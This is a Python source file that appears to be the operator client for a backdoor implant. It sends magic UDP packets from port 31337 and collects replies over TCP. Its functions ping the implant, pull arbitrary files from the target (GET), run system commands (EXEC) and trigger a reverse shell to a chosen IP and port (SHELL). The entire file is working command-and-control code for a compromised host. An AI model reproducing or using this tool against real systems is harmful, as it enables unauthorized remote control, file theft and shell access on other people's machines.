"""Everybody get up, it's time to slam now!"""
import base64
import ipaddress
import os
import pathlib
import socket
import time
from typing import Tuple

from .util import tcp_listener, udp_sender

MAGIC_SRC_PORT = 31337


def _send_cmd(
    msg: str,
    dest_ip: ipaddress.IPv4Address,
    dest_port: int,
    listen_port: int,
):
    """sends a magic cmd packet and returns the response"""
    # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
    encoded = base64.b64encode(msg.encode("ascii"))
    data = f"{listen_port};".encode("ascii") + encoded + b"\x00"

    with tcp_listener(listen_port) as tcp:
        with udp_sender(MAGIC_SRC_PORT) as udp:
            print(f"sending magic packet --> {dest_ip}:{dest_port}")
            udp.sendto(data, (str(dest_ip), dest_port))
        print("waiting for reply...")
        try:
            sock, addr = tcp.accept()
        except socket.timeout as err:
            raise ConnectionError("No response received!") from err
        response = b""
        while data := sock.recv(4096):
            response += data
        sock.close()
    decoded = base64.b64decode(response)
    if decoded.startswith(b"ERROR"):
        errno = int(decoded.split(b"ERROR: ")[1])
        raise RuntimeError(f"{errno} ({os.strerror(errno)})")
    return decoded


def cmd_ping(
    dest_ip: ipaddress.IPv4Address,
    dest_port: int,
    listen_port: int,
) -> bool:
    """send a ping"""
    response = _send_cmd("PING", dest_ip, dest_port, listen_port).decode("ascii")
    if "PONG" not in response:
        raise ValueError("Invalid response received!")
    return True


def cmd_get(
    dest_ip: ipaddress.IPv4Address,
    dest_port: int,
    listen_port: int,
    path: pathlib.PurePosixPath,
) -> bytes:
    """retrieve a file"""
    print(path)
    return _send_cmd(f"GET {path!s}", dest_ip, dest_port, listen_port)


def cmd_exec(
    dest_ip: ipaddress.IPv4Address,
    dest_port: int,
    listen_port: int,
    cmd: str,
) -> Tuple[int, str]:
    """run a system command"""
    msg = f"EXEC {cmd}"
    response = _send_cmd(msg, dest_ip, dest_port, listen_port).decode("ascii")
    try:
        if ";" in response:
            errno, output = response.split(";", 1)
        else:
            errno = int(response)
            output = "[output not captured]"
    except Exception:
        raise RuntimeError("Invalid command output rececived!")
    return errno, output


def cmd_shell(
    dest_ip: ipaddress.IPv4Address,
    dest_port: int,
    listen_port: int,
    shell_ip: ipaddress.IPv4Address,
    shell_port: int,
) -> bool:
    """connect a reverse shell"""
    msg = f"SHELL {shell_ip!s}:{shell_port}"
    response = _send_cmd(msg, dest_ip, dest_port, listen_port).decode("ascii")
    if "CONNECTED" not in response:
        raise ValueError("Invalid response received!")
    return True
